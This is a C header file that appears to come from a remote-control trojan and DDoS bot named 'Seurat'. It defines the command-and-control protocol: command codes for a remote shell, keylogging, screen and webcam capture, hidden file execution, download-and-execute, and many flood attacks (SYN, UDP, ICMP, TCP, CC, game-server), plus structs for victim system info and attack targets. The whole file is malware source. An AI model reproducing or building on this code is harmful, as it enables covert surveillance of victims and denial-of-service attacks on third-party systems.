#ifndef _SEURAT_COMMAND_H__
#define _SEURAT_COMMAND_H__

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include <winsock2.h>
#include "mstcpip.h"
#include "SafeBuffer.h"

// SOCKET buffer max length
#define BUFFER_MAXLEN		    1024*2
#define XCHANGE_BUFLEN          2 * 1024 * 1024 //2M

//socket type
#define SOCKET_CONNECT    0x11000000 //连接控制的socket
#define SOCKET_FILEMANAGE 0x11000001 //文件管理的socket
#define SOCKET_SCREEN     0x11000002 //屏幕监控的socket
#define SOCKET_CMDSHELL   0x11000003 //远程shell的socket
#define SOCKET_KEYLOG     0x11000004 //键盘记录的socket
#define SOCKET_PROCESS    0x11000005 //进程管理的socket
#define SOCKET_FILEDOWN   0x11000006 //文件下载的socket
#define SOCKET_FILEUP     0x11000007 //文件上传的socket
#define SOCKET_VIDEOCAP   0x11000008 //视频捕捉的socket
#define SOCKET_DLLLOADER  0x11000009 //Loader的socket

//基本命令
#define CMD_SUCCEED       0x00000000 //命令执行成功
#define CMD_FAILED        0x00000001 //命令执行失败
#define CMD_INVALID       0x00000002 //无效命令
#define CMD_HEARTBEAT     0x00000003 //心跳包
#define CMD_DLLDATA       0x00000004 //Dll for Loader

#define CMD_UNINSTALL     0x20000000 //卸载
#define CMD_POWEROFF      0x20000001 //关机
#define CMD_REBOOT        0x20000002 //重启
#define CMD_LOGOFF        0x20000003 //注销
#define CMD_DOWNEXEC      0x20000004 //下载执行
#define CMD_OPENURL       0x20000005 //打开网页
#define CMD_CTRLALTDEL    0x20000006 // Ctrl + Alt + del
#define CMD_KEYDOWN       0x20000011 //WM_KEYDOWN 
#define CMD_KEYUP         0x20000012 //WM_KEYUP
#define CMD_MOUSEMOVE     0x20000013 //WM_MOUSEMOVE
#define CMD_LBUTTONDOWN   0x20000014 //WM_LBUTTONDOWN
#define CMD_LBUTTONUP     0x20000015 //WM_LBUTTONUP
#define CMD_LBUTTONDBLCLK 0x20000016 //WM_LBUTTONDBLCLK
#define CMD_RBUTTONDOWN   0x20000017 //WM_RBUTTONDOWN   
#define CMD_RBUTTONUP     0x20000018 //WM_RBUTTONUP
#define CMD_RBUTTONDBLCLK 0x20000019 //WM_RBUTTONDBLCLK
#define CMD_RESTART       0x20000020 //Restart

//文件管理
#define CMD_FILEMANAGE    0x21000000 //开始文件管理进程
#define CMD_FILEMAGSTOP   0x21000001 //结束文件管理进程
#define CMD_FILEDRIVER    0x21000002 //获取驱动器
#define CMD_FILEDIRECTORY 0x21000003 //获取文件夹
#define CMD_FILEDELETE    0x21000004 //删除
#define CMD_FILEEXEC      0x21000005 //执行
#define CMD_FILEPASTE     0x21000006 //粘贴
#define CMD_FILERENAME    0x21000007 //重命名
#define CMD_FILEDOWNSTART 0x21000008 //下载开始
#define CMD_FILEDOWNING   0x21000009 //下载中
#define CMD_FILEUPSTART   0x2100000A //上传开始
#define CMD_FILEUPING     0x2100000B //上传中
#define CMD_READFILEEOR   0x2100000C //读文件错误
#define CMD_WRITEFILEEOR  0x2100000D //写文件错误
#define CMD_DIRFLODERERR  0x2100000E //文件夹不可读

//屏幕监控
#define CMD_SCREENSTART   0x22000001 //开始屏幕监控
#define CMD_SCREENBITS    0x22000002 //桌面图像颜色数
//远程shell相关消息
#define CMD_SHELLSTART    0x23000000 //开始CmdShell线程
#define CMD_SHELLSTOP     0x23000001 //结束CmdShell线程
#define CMD_SHELLRUN      0x23000002 //执行shell命令
#define CMD_SHELLERR      0x23000003 //执行shell命令错误

//键盘记录相关消息
#define CMD_KEYLOGSTART   0x24000001 //开始键盘记录
#define CMD_KEYLOGSTOP    0x24000002 //暂停键盘记录
#define CMD_KEYLOGCLOSE   0x24000003 //关闭键盘记录
//进程相关消息
#define CMD_PROCESSSTART  0x25000000 //开启进程管理
#define CMD_PROCESSSTOP   0x25000001 //结束进程管理
#define CMD_PROCESSLIST   0x25000002 //进程列表
#define CMD_PROCESSKILL   0x25000003 //结束进程
#define CMD_PROCLISTERR   0x25000004 //列举进程错误
#define CMD_PROCKILLERR   0x25000005 //关闭进程错误
//视频捕捉
#define CMD_VIDEOSTART    0x28000000 //视频捕捉
//拒绝服务
#define CMD_DDOSATTACK    0x30000000 //拒绝服务开始
#define CMD_DDOSSTOP      0x30000001 //拒绝服务停止
#define CMD_DDOSSYNFLOOD  0x31000001 //Syn Flood
#define CMD_DDOSICMPFLOOD 0x31000002 //Icmp Flood
#define CMD_DDOSUDPFLOOD  0x31000003 //Udp Flood
#define CMD_DDOSUDPSMALL  0x31000004 //Udp Small
#define CMD_DDOSTCPFLOOD  0x31000005 //Tcp Flood
#define CMD_DDOSTCPMULT   0x31000006 //Tcp Mult Connect
#define CMD_DDOSNOCACHE   0x32000001 //Get Method No Cache
#define CMD_DDOSCCATTACK  0x32000002 //CC Attack
#define CMD_DDOSGETNULL   0x32000003 //Get Method Get Null
#define CMD_DDOSCHUANQI   0x33000001 //ChuanQi game attack
#define CMD_DDOSNETGATE   0x33000002 //Net Gate
#define CMD_DDOSSMART     0x33000003 //Smart attck
#define CMD_DDOSSYNUDP    0x34000001 //Syn+Udp Flood
#define CMD_DDOSTCMPTCP   0x34000002 //Icmp+Tcp Flood
#define CMD_DDOSUDPTCP    0x34000003 //Udp+Tcp Flood
#define CMD_DDOSFINWAIT1  0x35000001 //Fin_Wait1 attack
#define CMD_DDOSFINWAIT2  0x35000002 //Fin_Wait2 attack
#define CMD_DDOSESTABLISH 0x35000003 //Stablished
#define CMD_DDOSSPIDERCC  0x36000001 //Spider CC Attack
#define CMD_DDOSCUSTOM    0x37000001 //custom data attack
///////////////////////////////////////////////////////////////////////
//结构定义，8字节对齐
//操作系统信息结构体
typedef struct tagSysInfo {
    char cComputer[64];  //机器名
    char cMemorySize[32];//内存大小
    char cOS[64];        //操作系统
    char cVersion[32];   //服务端版本
    BOOL bVideo;         //是否有摄像头
    int  iVipID;         //VIP用户ID
} SysInfo,*LPSysInfo;

//进程信息结构体
typedef struct tagProcessInfo {
    DWORD dwPid;        //进程ID
    DWORD dwThreads;    //线程总数
    DWORD dwPriClass;   //进程优先级
    char  FileName[32]; //进程映像名称
    char  FilePath[128];//进程路径
} ProcessInfo,*LPProcessInfo;

//硬盘结构体
typedef struct tagDriver {
    char driver[4];     //盘符名称
    char display[64];   //描述
    int  drivertype;    //盘类型
} DriverInfo, *LPDriverInfo;

//文件信息结构体
typedef struct tagFileInfo {
    int  iType;         //1-目录，2-文件，3-无效目录
    char cFileName[64]; //文件名
    char cAttrib[32];   //文件属性
    char cTime[32];     //时间
    char cSize[32];     //文件大小
} FileInfo,*LPFileInfo;

//文件操作信息结构体
typedef struct tagFileOpt {
    int  iSize;         //上传下载文件表示文件大小，-1表示隐藏运行,1表示正常运行
    char cScrFile[100];
    char cDstFile[100];
} FileOpt;

//攻击信息结构体
typedef struct tagDdosAttack {
    char szTarget[200];//攻击目标
    int  iPort;        //攻击端口
    int  iThread;      //线程
    int  iExtend1;     //附加数据
    int  iExtend2;     //附加数据
} DdosAttack,*LPDdosAttack;

//消息头结构体
typedef struct tagMsgHead {
    //传输屏幕时可做如下用途：
    DWORD dwCmd;       //消息命令   /第几帧
    DWORD dwSize;      //数据长度   /数据长度
    DWORD dwExtend1;   //附加数据   /压缩前长度
    DWORD dwExtend2;   //附加数据   /压缩后长度
} MsgHead,*LPMsgHead;

//开启TCP保活机制
BOOL TurnonKeepAlive(SOCKET s, UINT nKeepAliveSec);

//发送数据
BOOL SendData(SOCKET s, const char *data, int len);
//接收数据
BOOL RecvData(SOCKET s, char *data, int len);
//发送消息
BOOL SendMsg(SOCKET s, SafeBuffer pBuf, LPMsgHead lpMsgHead);
//接收消息
BOOL RecvMsg(SOCKET s, SafeBuffer pBuf, LPMsgHead lpMsgHead);

#endif
